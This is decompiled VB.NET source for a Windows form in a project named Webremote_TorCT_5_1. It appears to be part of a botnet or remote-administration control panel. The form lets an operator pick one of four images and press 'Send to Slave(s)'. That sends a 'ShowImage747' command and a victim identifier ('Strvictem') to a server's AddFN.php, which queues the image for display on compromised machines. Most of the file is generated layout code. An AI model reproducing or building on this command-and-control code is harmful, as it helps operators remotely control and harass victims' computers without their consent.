Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class ShowImageScreen
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.ShowImageScreen_Load)
            Dim list As List(Of WeakReference) = ShowImageScreen.__ENCList
            SyncLock list
                ShowImageScreen.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.a = Nothing
            Me.SendCommand = New WebClient
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFN.php?Function=ShowImage747:" & Me.a.ToString & MyProject.Forms.Client.Strvictem.ToString))
                Interaction.MsgBox("Sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("Somthing is wrong", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(ShowImageScreen))
            Me.PictureBox1 = New PictureBox
            Me.RadioButton1 = New RadioButton
            Me.RadioButton2 = New RadioButton
            Me.PictureBox2 = New PictureBox
            Me.RadioButton3 = New RadioButton
            Me.PictureBox3 = New PictureBox
            Me.RadioButton4 = New RadioButton
            Me.PictureBox4 = New PictureBox
            Me.Button1 = New Button
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox2, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox3, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox4, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Me.PictureBox1.BackgroundImage = DirectCast(manager.GetObject("PictureBox1.BackgroundImage"), Image)
            Dim point As New Point(12, 12)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            Dim size As New Size(170, 170)
            Me.PictureBox1.Size = size
            Me.PictureBox1.TabIndex = 0
            Me.PictureBox1.TabStop = False
            Me.RadioButton1.AutoSize = True
            point = New Point(&H5B, &HB8)
            Me.RadioButton1.Location = point
            Me.RadioButton1.Name = "RadioButton1"
            size = New Size(14, 13)
            Me.RadioButton1.Size = size
            Me.RadioButton1.TabIndex = 1
            Me.RadioButton1.TabStop = True
            Me.RadioButton1.UseVisualStyleBackColor = True
            Me.RadioButton2.AutoSize = True
            point = New Point(&H10B, &HB8)
            Me.RadioButton2.Location = point
            Me.RadioButton2.Name = "RadioButton2"
            size = New Size(14, 13)
            Me.RadioButton2.Size = size
            Me.RadioButton2.TabIndex = 3
            Me.RadioButton2.TabStop = True
            Me.RadioButton2.UseVisualStyleBackColor = True
            Me.PictureBox2.BackgroundImage = DirectCast(manager.GetObject("PictureBox2.BackgroundImage"), Image)
            point = New Point(&HBC, 12)
            Me.PictureBox2.Location = point
            Me.PictureBox2.Name = "PictureBox2"
            size = New Size(170, 170)
            Me.PictureBox2.Size = size
            Me.PictureBox2.TabIndex = 2
            Me.PictureBox2.TabStop = False
            Me.RadioButton3.AutoSize = True
            point = New Point(&H1BB, &HB8)
            Me.RadioButton3.Location = point
            Me.RadioButton3.Name = "RadioButton3"
            size = New Size(14, 13)
            Me.RadioButton3.Size = size
            Me.RadioButton3.TabIndex = 5
            Me.RadioButton3.TabStop = True
            Me.RadioButton3.UseVisualStyleBackColor = True
            Me.PictureBox3.BackgroundImage = DirectCast(manager.GetObject("PictureBox3.BackgroundImage"), Image)
            point = New Point(&H16C, 12)
            Me.PictureBox3.Location = point
            Me.PictureBox3.Name = "PictureBox3"
            size = New Size(170, 170)
            Me.PictureBox3.Size = size
            Me.PictureBox3.TabIndex = 4
            Me.PictureBox3.TabStop = False
            Me.RadioButton4.AutoSize = True
            point = New Point(&H26B, &HB8)
            Me.RadioButton4.Location = point
            Me.RadioButton4.Name = "RadioButton4"
            size = New Size(14, 13)
            Me.RadioButton4.Size = size
            Me.RadioButton4.TabIndex = 7
            Me.RadioButton4.TabStop = True
            Me.RadioButton4.UseVisualStyleBackColor = True
            Me.PictureBox4.BackgroundImage = DirectCast(manager.GetObject("PictureBox4.BackgroundImage"), Image)
            point = New Point(540, 12)
            Me.PictureBox4.Location = point
            Me.PictureBox4.Name = "PictureBox4"
            size = New Size(170, 170)
            Me.PictureBox4.Size = size
            Me.PictureBox4.TabIndex = 6
            Me.PictureBox4.TabStop = False
            point = New Point(&H119, &HD4)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H9D, &H17)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 8
            Me.Button1.Text = "Send to Slave(s)"
            Me.Button1.UseVisualStyleBackColor = True
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H2D6, &HF4)
            Me.ClientSize = size
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.RadioButton4)
            Me.Controls.Add(Me.PictureBox4)
            Me.Controls.Add(Me.RadioButton3)
            Me.Controls.Add(Me.PictureBox3)
            Me.Controls.Add(Me.RadioButton2)
            Me.Controls.Add(Me.PictureBox2)
            Me.Controls.Add(Me.RadioButton1)
            Me.Controls.Add(Me.PictureBox1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "ShowImageScreen"
            Me.Text = "Chose image to show!"
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox2, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox3, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox4, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub RadioButton1_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton1.Checked Then
                Me.Button1.Enabled = True
                Me.a = Conversions.ToString(1)
            End If
        End Sub

        Private Sub RadioButton2_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton2.Checked Then
                Me.Button1.Enabled = True
                Me.a = Conversions.ToString(2)
            End If
        End Sub

        Private Sub RadioButton3_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton3.Checked Then
                Me.Button1.Enabled = True
                Me.a = Conversions.ToString(3)
            End If
        End Sub

        Private Sub RadioButton4_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton4.Checked Then
                Me.Button1.Enabled = True
                Me.a = Conversions.ToString(4)
            End If
        End Sub

        Private Sub ShowImageScreen_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.Button1.Enabled = False
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = WithEventsValue
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As PictureBox)
                Me._PictureBox1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property PictureBox2 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As PictureBox)
                Me._PictureBox2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property PictureBox3 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As PictureBox)
                Me._PictureBox3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property PictureBox4 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As PictureBox)
                Me._PictureBox4 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property RadioButton1 As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._RadioButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton1_CheckedChanged)
                If (Not Me._RadioButton1 Is Nothing) Then
                    RemoveHandler Me._RadioButton1.CheckedChanged, handler
                End If
                Me._RadioButton1 = WithEventsValue
                If (Not Me._RadioButton1 Is Nothing) Then
                    AddHandler Me._RadioButton1.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton2 As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._RadioButton2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton2_CheckedChanged)
                If (Not Me._RadioButton2 Is Nothing) Then
                    RemoveHandler Me._RadioButton2.CheckedChanged, handler
                End If
                Me._RadioButton2 = WithEventsValue
                If (Not Me._RadioButton2 Is Nothing) Then
                    AddHandler Me._RadioButton2.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton3 As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._RadioButton3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton3_CheckedChanged)
                If (Not Me._RadioButton3 Is Nothing) Then
                    RemoveHandler Me._RadioButton3.CheckedChanged, handler
                End If
                Me._RadioButton3 = WithEventsValue
                If (Not Me._RadioButton3 Is Nothing) Then
                    AddHandler Me._RadioButton3.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton4 As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._RadioButton4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton4_CheckedChanged)
                If (Not Me._RadioButton4 Is Nothing) Then
                    RemoveHandler Me._RadioButton4.CheckedChanged, handler
                End If
                Me._RadioButton4 = WithEventsValue
                If (Not Me._RadioButton4 Is Nothing) Then
                    AddHandler Me._RadioButton4.CheckedChanged, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("PictureBox2")> _
        Private _PictureBox2 As PictureBox
        <AccessedThroughProperty("PictureBox3")> _
        Private _PictureBox3 As PictureBox
        <AccessedThroughProperty("PictureBox4")> _
        Private _PictureBox4 As PictureBox
        <AccessedThroughProperty("RadioButton1")> _
        Private _RadioButton1 As RadioButton
        <AccessedThroughProperty("RadioButton2")> _
        Private _RadioButton2 As RadioButton
        <AccessedThroughProperty("RadioButton3")> _
        Private _RadioButton3 As RadioButton
        <AccessedThroughProperty("RadioButton4")> _
        Private _RadioButton4 As RadioButton
        Private a As String
        Private components As IContainer
        Private SendCommand As WebClient
    End Class
End Namespace

